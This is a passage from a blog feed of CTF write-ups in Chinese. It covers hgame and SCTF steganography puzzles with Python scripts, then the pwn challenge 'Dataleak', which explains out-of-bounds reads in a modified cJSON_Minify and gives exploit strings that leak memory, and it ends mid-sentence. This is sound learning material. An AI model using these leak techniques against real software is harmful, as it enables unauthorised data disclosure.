data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437796/Typera/2023/04/473ee4ccb1baae2f6d8baebff4eb969b.png\" alt=\"image-20230425234952577\" /><br />\n 保存后，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZW1vLmR5bmFtc29mdC5jb20vYmFyY29kZS1yZWFkZXIv\">在线扫描图片</span>得到前半段 flag  <code>hgame&#123;ez_1mg_</code></p>\n<p>然后在 Analyse-&gt;Data Extract 里面，<br />\n按下图所示操作，可以得到后半 flag  <code>Steg4n0graphy&#125;</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437806/Typera/2023/04/c026469fb7ab3fceba720421bc3cea72.png\" alt=\"image-20230425235001793\" /></p>\n<h3 id=\"群青其实是幽灵东京\"><a class=\"anchor\" href=\"#群青其实是幽灵东京\">#</a> 群青 (其实是幽灵东京）</h3>\n<p>拿到.wav 文件，发现属性里藏了提示：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437816/Typera/2023/04/61191b2c8ce2754adbb5f4270499d7fc.png\" alt=\"image-20230425235012882\" /><br />\n 提示使用用 SilentEye，<br />\n直接 Decode 显示不正确，所以猜测要使用密码</p>\n<p>Audacity 打开，查看频谱图发现：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437826/Typera/2023/04/9b37356f52ea60ba659337e1615d5527.png\" alt=\"image-20230425235021424\" /><br />\n 猜测大概就是 key 了：Yoasobi<br />\n 解密得到一串网址，貌似是一个音频文件的地址<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437834/Typera/2023/04/097e85d689cebdbc315a2e1d74bf20c1.png\" alt=\"image-20230425235030317\" /><br />\n 访问下载得音频文件 S_S_T_V.wav</p>\n<p>搜索 SSTV，得知：SSTV（Slow-scan television）是一种图像传输方法，主要由业余无线电操作员使用，通过单色或彩色无线电发送和接收静态图像。</p>\n<p>原本想使用 RX-SSTV 解码器，但是貌似我的电脑上还需要安装一个叫 Virtual Audio Cable 的虚拟声卡，实在是太麻烦了 (╯□╰)<br />\n 所以我就干脆在手机上下载了 Robot36，用电脑播放音频，手机接听，最后得到这样一张图<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437848/Typera/2023/04/267cd6c07e0bbbdcb3b0b57595089963.png\" alt=\"image-20230425235041961\" /></p>\n<p>然后扫码得到 flag： <code>hgame&#123;1_c4n_5ee_the_wav&#125;</code></p>\n",
            "tags": [
                "Python",
                "Crypto",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/SCTF%E5%A4%8D%E7%8E%B0/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/SCTF%E5%A4%8D%E7%8E%B0/",
            "title": "SCTF复现",
            "date_published": "2022-01-29T16:18:22.000Z",
            "content_html": "<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"fumo_xor_cli116\"><a class=\"anchor\" href=\"#fumo_xor_cli116\">#</a> fumo_xor_cli（1.16）</h3>\n<p>啊啊啊，做这道题的时候就差一点，两张需要 xor 的图也导出来了，就是第一张那个需要叠加的图貌似排反了 ┭┮﹏┭┮<br />\n<s>（做的时候就发现两张图长度都是一样的，难怪我说 xor 出来不太对劲。。。）</s></p>\n<h4 id=\"第一张图\"><a class=\"anchor\" href=\"#第一张图\">#</a> 第一张图</h4>\n<p>nc 连上之后，发现出来了一堆彩色字符<br />\n python PIL 转为图片，发现中间有两张图片部分有点奇怪<br />\n搜索了一下大概是 ANSI 转义字符，大致格式如下：</p>\n<blockquote>\n<p>\\x1b[ 38 ; 2 ;  208 ; 243 ; 251 m9<br />\n38;2;<em>r</em>;<em>g</em>;<em>b</em> Set text colour to an RGB value (e.g.  <code>\\x1b[38;2;255;255;0m</code> )</p>\n</blockquote>\n<p>由于 编程水平稀烂，总之写的转 png 的代码。。。一言难尽<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\">r=remote(<span class=\"string\">&quot;124.70.150.39&quot;</span>,<span class=\"number\">2333</span>)</span><br><span class=\"line\">img=[]</span><br><span class=\"line\">k=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span>(k&lt;<span class=\"number\">56</span>):</span><br><span class=\"line\">\timg.append(Image.new(<span class=\"string\">&quot;RGB&quot;</span>,(<span class=\"number\">133</span>,<span class=\"number\">50</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">\tr.recvuntil(<span class=\"string\">b&#x27;\\x1b[&#x27;</span>)</span><br><span class=\"line\">\ts=r.recvuntil(<span class=\"string\">b&#x27;\\x1b[&#x27;</span>)</span><br><span class=\"line\">\tj=<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> j&lt;<span class=\"number\">50</span>:</span><br><span class=\"line\">\t\ti=<span class=\"number\">0</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> s==<span class=\"string\">b&#x27;A\\x1b[&#x27;</span>:</span><br><span class=\"line\">\t\t\t\ts=r.recvuntil(<span class=\"string\">b&#x27;\\x1b[&#x27;</span>)</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">#print(s)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\ts=r.recvuntil(<span class=\"string\">b&#x27;\\x1b[&#x27;</span>)</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">#print(s)</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">b&#x27;\\n&#x27;</span><span class=\"keyword\">in</span> s:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">#print(s.split(b&#x27;;&#x27;)[2:])</span></span><br><span class=\"line\">\t\t\t\tpixTuple=(<span class=\"built_in\">int</span>((s.split(<span class=\"string\">b&#x27;;&#x27;</span>)[<span class=\"number\">2</span>:])[<span class=\"number\">0</span>]),<span class=\"built_in\">int</span>((s.split(<span class=\"string\">b&#x27;;&#x27;</span>)[<span class=\"number\">2</span>:])[<span class=\"number\">1</span>]),<span class=\"built_in\">int</span>((s.split(<span class=\"string\">b&#x27;;&#x27;</span>)[<span class=\"number\">2</span>:])[<span class=\"number\">2</span>][:-<span class=\"number\">4</span>]))</span><br><span class=\"line\">\t\t\t\timg[k].putpixel((i,j),pixTuple)</span><br><span class=\"line\">\t\t\t\ti=i+<span class=\"number\">1</span></span><br><span class=\"line\">\t\tj=j+<span class=\"number\">1</span></span><br><span class=\"line\">\timg[k].save(<span class=\"string\">&#x27;/1/%d.png&#x27;</span>%(k))</span><br><span class=\"line\">\tk=k+<span class=\"number\">1</span></span><br></pre></td></tr></table></figure><br />\n 所以我们得到了 56 张图片，emm... 中间有两张是，五彩斑斓的，肯定有问题，<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436722/Typera/2023/04/1fe97ece1c8993cbf990893b9dd0679d.png\" alt=\"SM1\" /><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436754/Typera/2023/04/eea64334d4a3ac700d91945121083752.png\" alt=\"SM2\" /></p>\n<h4 id=\"第二张图\"><a class=\"anchor\" href=\"#第二张图\">#</a> 第二张图</h4>\n<p>在 Lu1u 的提示下，原来这里面还有个网址，进入 (<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvRV9pREpCa1ZFQzRqWmFuenZxbldDQTA=\">https://mp.weixin.qq.com/s/E_iDJBkVEC4jZanzvqnWCA0</span>)<br />\n 在最后找到了一张 fumo 的图片<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436784/Typera/2023/04/3ca22b531d34b89abc0f97bc0c306804.png\" alt=\"SM3\" /><br />\n 放大发现了一个间隔为 9 的点阵，因为感觉这些点的颜色和上面得到的那两张图挺像的，所以想到继续可以把这些点提出来合成一张图片</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\">img0=Image.new(<span class=\"string\">&#x27;RGB&#x27;</span>,(<span class=\"number\">100</span>,<span class=\"number\">133</span>))</span><br><span class=\"line\">img1=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./fumo.png&#x27;</span>)</span><br><span class=\"line\">w,h=img1.size</span><br><span class=\"line\">i=<span class=\"number\">1</span></span><br><span class=\"line\">ni=<span class=\"number\">0</span></span><br><span class=\"line\">j=<span class=\"number\">1</span></span><br><span class=\"line\">nj=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> i&lt;w:</span><br><span class=\"line\">\tj=<span class=\"number\">1</span></span><br><span class=\"line\">\tnj=<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> j&lt;h:</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(j==<span class=\"number\">1198</span>):</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\timg0.putpixel((ni,nj),img1.getpixel((i,j)))</span><br><span class=\"line\">\t\tj=j+<span class=\"number\">9</span></span><br><span class=\"line\">\t\tnj=nj+<span class=\"number\">1</span></span><br><span class=\"line\">\ti=i+<span class=\"number\">9</span></span><br><span class=\"line\">\tni=ni+<span class=\"number\">1</span></span><br><span class=\"line\">img0.show()</span><br></pre></td></tr></table></figure><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436814/Typera/2023/04/244e58d3d0b2a5daf7ee5837e5d8beb1.png\" alt=\"SM4\" /></p>\n<h4 id=\"xor\"><a class=\"anchor\" href=\"#xor\">#</a> XOR</h4>\n<p>前面得到的两张图均为 133x50，而第二张图 100x133，这不是巧了，<br />\n前两张张图加在一起，跟后面的那张长宽一样，再结合题目 fumo_xor_cli<br />\nemm... XOR 啊<br />\n思路就有了，<s>结果就拼图这一步，方向错了〒▽〒</s><br />\n先观察一下四个角的像素点，把那两张图旋转一下，拼在一起<br />\n最后使用 stegsolve 异或一下就可以了<br />\n可能是因为拼图做的太糙了，所以异或出来的图有亿点不太对劲<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436840/Typera/2023/04/a7cb74294bd4da8aa2f732cbc86f4c4b.bmp\" alt=\"SM5\" /><br />\nps 处理了一下总算好看了<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436868/Typera/2023/04/8898d7e36e8d29377d803605af7967da.png\" alt=\"SM6\" /></p>\n<h3 id=\"in_the_vaporwaves117118\"><a class=\"anchor\" href=\"#in_the_vaporwaves117118\">#</a> in_the_vaporwaves（1.17/1.18）</h3>\n<p>此前我对音频隐写了解甚少，只会简单地使用 Audacity，对音频文件做一些基本的观察、操作，<br />\n本题中涉及到 Python 的 wave 库使用，那就可以正好趁这个机会去学习一下。</p>\n<h4 id=\"观察原文件\"><a class=\"anchor\" href=\"#观察原文件\">#</a> 观察原文件</h4>\n<p>通过 Audacity 打开 c.wav，播放的时候稍微有点杂音，但听不出有什么不太对的地方 (/▽＼)<br />\n 放大来看，可以看出左右声道的波形貌似正好上下相反：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436891/Typera/2023/04/942c468dbd87e4787052099f715283e8.png\" alt=\"image-20230425233447828\" /></p>\n<h4 id=\"1使用wave库\"><a class=\"anchor\" href=\"#1使用wave库\">#</a> ①使用 Wave 库</h4>\n<p>使用 python 的 Wave 库将左右声道加起来，导出为一个 a.wav 的文件</p>\n<blockquote>\n<p><strong>nchannels</strong>: 声道数，<strong>sampwidth</strong>: 量化位数，<strong>framerate</strong>: 采样频率，<strong>nframes</strong>: 采样点数</p>\n</blockquote>\n<p>Wave 写入对象</p>\n<blockquote>\n<p><strong>Wave_write.setnchannels(n)</strong><br />\n 设置声道数。</p>\n</blockquote>\n<blockquote>\n<p><strong>Wave_write.setsampwidth(n)</strong><br />\n 设置采样字节长度为 n。</p>\n</blockquote>\n<blockquote>\n<p><strong>Wave_write.setframerate(n)</strong><br />\n 设置采样频率为 n。</p>\n</blockquote>\n<blockquote>\n<p>Wave_write.writeframes(data)<br />\n 写入音频帧并确保 nframes 是正确的。 如果输出流不可查找且在 data 被写入之后写入的总帧数与之前设定的 nframes 值不匹配将会引发错误。</p>\n</blockquote>\n<p>Write 读取对象</p>\n<blockquote>\n<p><strong>Wave_read.getnframes()</strong><br />\n 返回音频总帧数。<br />\n<strong>Wave_read.readframes(n)</strong><br />\n 读取并返回以 bytes 对象表示的最多 n 帧音频。</p>\n</blockquote>\n<p>struct 库：将字节串解读为打包的二进制数据</p>\n<blockquote>\n<p><strong>struct.unpack(format, buffer)</strong><br />\n 根据格式字符串 format 从缓冲区 buffer 解包（假定是由 pack (format, ...) 打包）。 结果为一个元组，即使其只包含一个条目。 缓冲区的字节大小必须匹配格式所要求的大小，如 calcsize () 所示。<br />\n<strong>struct.pack(format, v1, v2, ...)</strong><br />\n 返回一个 bytes 对象，其中包含根据格式字符串 format 打包的值 v1, v2, ... 参数个数必须与格式字符串所要求的值完全匹配。</p>\n</blockquote>\n<p>参照官方 wp，编写的脚本：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> wave</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"><span class=\"keyword\">with</span> wave.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;c.wav&quot;</span>,<span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> c:</span><br><span class=\"line\">\t<span class=\"keyword\">with</span> wave.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;a.wav&quot;</span>,<span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> a:</span><br><span class=\"line\">\t\ta.setnchannels(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\ta.setsampwidth(<span class=\"number\">2</span>)  <span class=\"comment\">#此处量化位数应改为2</span></span><br><span class=\"line\">\t\ta.setframerate(<span class=\"number\">44100</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(c.getnframes()):</span><br><span class=\"line\">\t\t\tl,r=struct.unpack(<span class=\"string\">&#x27;hh&#x27;</span>, c.readframes(<span class=\"number\">1</span>))</span><br><span class=\"line\">\t\t\td=l+r</span><br><span class=\"line\">\t\t\ta.writeframes(struct.pack(<span class=\"string\">&#x27;h&#x27;</span>,d))</span><br></pre></td></tr></table></figure><br />\n 但是，实际运行的时候，我发现这个脚本貌似有点问题...<br />\n 如果直接套用运行出来的音频长这样：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436900/Typera/2023/04/c6b92eaad52ca5f54cbb80e1c01191cc.png\" alt=\"image-20230425233457628\" /><br />\n 然后我仔细检查发现，官方 wp 的量化位数设成了 1，改成 2 就可以了... (。_。)<br />\n（着实花了我好久，还以为是我自己写错了）<br />\n出来的 a.wav 如下图<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436908/Typera/2023/04/47a2223d0102f0f858b27c6b0cc851ae.png\" alt=\"image-20230425233505802\" /></p>\n<p>但是，这脚本运行的时间也太长了吧，<strong>[Finished in 262.9s]</strong>  (￣▽￣)&quot;<br />\n 所以我又找到了一个比较快捷的方法：</p>\n<h4 id=\"2ffmpeg\"><a class=\"anchor\" href=\"#2ffmpeg\">#</a> ②ffmpeg</h4>\n<p>使用 ffmpeg 进行双声道合并，<br />\n从<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mZm1wZWcub3Jn\">链接</span>（<span class=\"exturl\" data-url=\"aHR0cHM6Ly9qb2hudmFuc2lja2xlLmNvbS9mZm1wZWcvJUVGJUJDJTg5JUU0JUI4JThCJUU4JUJEJUJEZmZtcGVnJUU1JTg4JUIwTGludXglRTclOEUlQUYlRTUlQTIlODMlRTQlQjglOEIlRUYlQkMlOEMlRTglQkYlOTAlRTglQTElOEMlRUYlQkMlOUE=\">https://johnvansickle.com/ffmpeg/）下载 ffmpeg 到 Linux 环境下，运行：</span><br />\n <code>ffmpeg -i c.wav -f wav -ac 1 -ab 128k -y 1_dan1.wav</code>  命令，<br />\n获得 a.wav 文件。</p>\n<p>这次得到的 a.wav 是这样的：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436919/Typera/2023/04/6e8ff45b5b28216617a2427f50628c81.png\" alt=\"image-20230425233516666\" /><br />\n 差别不大～<br />\n 这就是比较常规的摩斯密码了，转换后得到 flag</p>\n<h4 id=\"摩斯电码音频转文字119\"><a class=\"anchor\" href=\"#摩斯电码音频转文字119\">#</a> 摩斯电码音频转文字（1.19）</h4>\n<p>emm... 我顺带研究了一下，如何用 python 把摩斯密码从音频文件里直接读出来，<br />\n这个脚本我另外找了一道题试验了一下，应该是没啥问题的，<br />\n（它只适用于单声道的摩斯电码，所以使用前要先处理好音频文件）<br />\n稀烂的编程水平就不提了，代码如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> wave</span><br><span class=\"line\"><span class=\"keyword\">from</span> scipy.io <span class=\"keyword\">import</span> wavfile</span><br><span class=\"line\"></span><br><span class=\"line\">filename = <span class=\"string\">&#x27;a.wav&#x27;</span></span><br><span class=\"line\">WAVE = wave.<span class=\"built_in\">open</span>(filename)</span><br><span class=\"line\">sample_frequency, audio_sequence = wavfile.read(filename)</span><br><span class=\"line\">space=[]</span><br><span class=\"line\">voice=[]</span><br><span class=\"line\">l1=<span class=\"number\">0</span></span><br><span class=\"line\">l2=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(WAVE.getparams().nframes):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(audio_sequence[i]&lt;=<span class=\"number\">10</span> <span class=\"keyword\">and</span> audio_sequence[i]&gt;=-<span class=\"number\">10</span>):</span><br><span class=\"line\">        l1=l1+<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span>((audio_sequence[i-<span class=\"number\">1</span>]&lt;=<span class=\"number\">10</span> <span class=\"keyword\">and</span> audio_sequence[i-<span class=\"number\">1</span>]&gt;=-<span class=\"number\">10</span>) <span class=\"keyword\">and</span> (audio_sequence[i]&gt;<span class=\"number\">10</span> <span class=\"keyword\">or</span> audio_sequence[i]&lt;-<span class=\"number\">10</span>)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> l1&gt;<span class=\"number\">1</span>:</span><br><span class=\"line\">            space.append(l1)</span><br><span class=\"line\">        l1=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(WAVE.getparams().nframes):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(audio_sequence[i]&gt;<span class=\"number\">10</span> <span class=\"keyword\">or</span> audio_sequence[i]&lt;-<span class=\"number\">10</span>):</span><br><span class=\"line\">        l2=l2+<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span>((audio_sequence[i-<span class=\"number\">1</span>]&gt;<span class=\"number\">10</span> <span class=\"keyword\">or</span> audio_sequence[i-<span class=\"number\">1</span>]&lt;-<span class=\"number\">10</span>) <span class=\"keyword\">and</span> (audio_sequence[i]&lt;=<span class=\"number\">10</span> <span class=\"keyword\">and</span> audio_sequence[i]&gt;=-<span class=\"number\">10</span>) <span class=\"keyword\">and</span> (audio_sequence[i+<span class=\"number\">1</span>]&lt;=<span class=\"number\">10</span> <span class=\"keyword\">and</span> audio_sequence[i+<span class=\"number\">1</span>]&gt;=-<span class=\"number\">10</span>)):</span><br><span class=\"line\">        voice.append(l2)</span><br><span class=\"line\">        l2=<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">m_s=<span class=\"built_in\">min</span>(space)</span><br><span class=\"line\">M_s=<span class=\"built_in\">max</span>(space[<span class=\"number\">1</span>:])</span><br><span class=\"line\">m_v=<span class=\"built_in\">min</span>(voice)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">tran</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(voice[i]//m_v==<span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;.&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;-&#x27;</span></span><br><span class=\"line\">Str=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(space)):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(space[i]//m_s==<span class=\"number\">1</span>):</span><br><span class=\"line\">        Str=Str+tran(i)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span>(space[i]&gt;M_s):</span><br><span class=\"line\">    \tvoice.insert(i,voice[i])</span><br><span class=\"line\">    \tStr=Str+<span class=\"string\">&#x27;/&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        Str=Str+tran(i)+<span class=\"string\">&#x27;/&#x27;</span></span><br><span class=\"line\">Str=Str+tran(<span class=\"built_in\">len</span>(voice)-<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> (Str)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> pwn</h2>\n<blockquote>\n<p>pwn 部分... 由于我手残删掉了保存源文件，最后只问学长要到了其中两道题的，对我复现造成了极大的困扰，不过幸好这次的官方 wp 挺详细的，还可以对着 wp 一点一点的想，但我是菜鸡本菜，还是花了超多的时间去复现 ╥﹏╥... 不过总体来说收获还是挺多的</p>\n</blockquote>\n<h3 id=\"dataleak129\"><a class=\"anchor\" href=\"#dataleak129\">#</a> Dataleak（1.29）</h3>\n<p><s>（隔了挺久的... 除了中间混了个 hgame，还有 HWS 入营赛 (虽然太菜了没啥用)，当然还有在认真地摸鱼啦）</s></p>\n<p>连上远程，需要 leak 的数据长度为 22，<br />\nIDA 查看 cJSON_PWN：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436929/Typera/2023/04/4dcc2553fda4e522e344eccb3f71b8fd.png\" alt=\"image-20230425233526169\" /><br />\n 内存结构还是比较清楚的<br />\n按定义顺序，先是 buf，然后是 v5，最后是 v6 (存要 leak 的数据的地方)<br />\n 两次循环，每次 buf、v5，写入数据长 14，结尾均有 \\x00<br />\n 每次 cJSON_Minify () 先处理 buf 的字符，然后读出 v5 中 11 字节</p>\n<h4 id=\"漏洞点\"><a class=\"anchor\" href=\"#漏洞点\">#</a> 漏洞点</h4>\n<p>一共应该有两个漏洞点，可以从给的 so 文件中查看，</p>\n<ul>\n<li>处理 /* 的时候，会不断遍历中间的字符直到遇到 \\x00 <s>（或 */ ）</s>，可能造成越界<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436937/Typera/2023/04/560f7380f89320b8d0bfa86942368be9.png\" alt=\"image-20230425233533907\" /></li>\n<li>处理 &quot; 的时候，如果遇到 \\ ，会越过两个字符<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436946/Typera/2023/04/0d185944b3f9a89c3f0cebb68e2e1cdd.png\" alt=\"image-20230425233541340\" /></li>\n</ul>\n<p>其中，第一个漏洞会将遍历到的字符舍去，所以后续的字符会填充到遍历过的字符位置上（包括 /*），而第二个漏洞只会越过 \\ 后的两个字符，中间遍历的字符将会保留。</p>\n<p>所以会有多个方法实现 data 的泄露，而第一个漏洞能够达成的效果强于第二个，所以可以全程使用第一个漏洞完成泄露</p>\n<h4 id=\"漏洞利用\"><a class=\"anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h4>\n<p>由于一次只能读取 11 个字符，所以需要 leak 两次，<br />\n但大致思路就是要利用漏洞，先越过 buf 后的 \\x00，让 cJSON_PWN 能继续处理 v5 的字符，<br />\n然后变换 /* 的位置，将 v5 内的字符替换为我们所需要的 data</p>\n<h5 id=\"方法1\"><a class=\"anchor\" href=\"#方法1\">#</a> 方法 1</h5>\n<p>如果两个漏洞都想利用到的话，可以先使用第二个漏洞，将 \\ 出现的位置放在 buf 的末尾（就是第 14 个字符），从而越过后面的 \\x00 继续处理 v5，<br />\n然后 /* 放在 v5 的开头，直接替换后面 16 个 data 的位置（算上开头的 /* 和末尾的 \\x00 一共 16 个）<br />\n<strong>exp1：</strong> <code>&quot;aaaaaaaaaaaa\\/*aaaaaaaaaaaa</code> <br />\n 获得前 11 个 data</p>\n<p>要获得后 11 个 data，必须要把前 11 个 data 放到 buf 里面，才能让后 11 个 buf 出现在 v5 里被读出来，<br />\n这里再用第二个漏洞实在是太麻烦了（仔细想了想，<strong>貌似也不可能</strong>），所以就用第一个解决。</p>\n<p>一个的 /* 直接放在开头，把后面的 16 个字符换进来，另一个的 /* 放在第 6 个字符的位置，这样加上后面包括 \\x00 在内的字符，一共有 11 个，<br />\n这样就把前 11 个 data 再换到 buf 里面，这样后 11 个 data 就正好再 v5 里面被读取<br />\n<strong> exp2：</strong> <code>/*aaaaaaaaaaaaaaaaa/*aaaaaaa</code> <br />\n 获得后 11 个 data。（实际上<strong> exp2</strong> 前后两个可以颠倒，效果一致，因为这里的 exp 无论是先换 16 个字符还是先换那 11 个，都是一样的）</p>\n<h5 id=\"方法2\"><a class=\"anchor\" href=\"#方法2\">#</a> 方法 2</h5>\n<p>方法 2 只变了 leak 前 11 个 data 的方法，后 11 个 data 的方式是一致的<br />\n把 /* 放在 buf 的末尾，算上 \\x00 一共会替换 4 个字符，为防止 data 的前 4 个字符被换进 buf，先用 aaaa 组成 v5 的前 4 个，然后再加上 /* ，替换出后面的 data<br 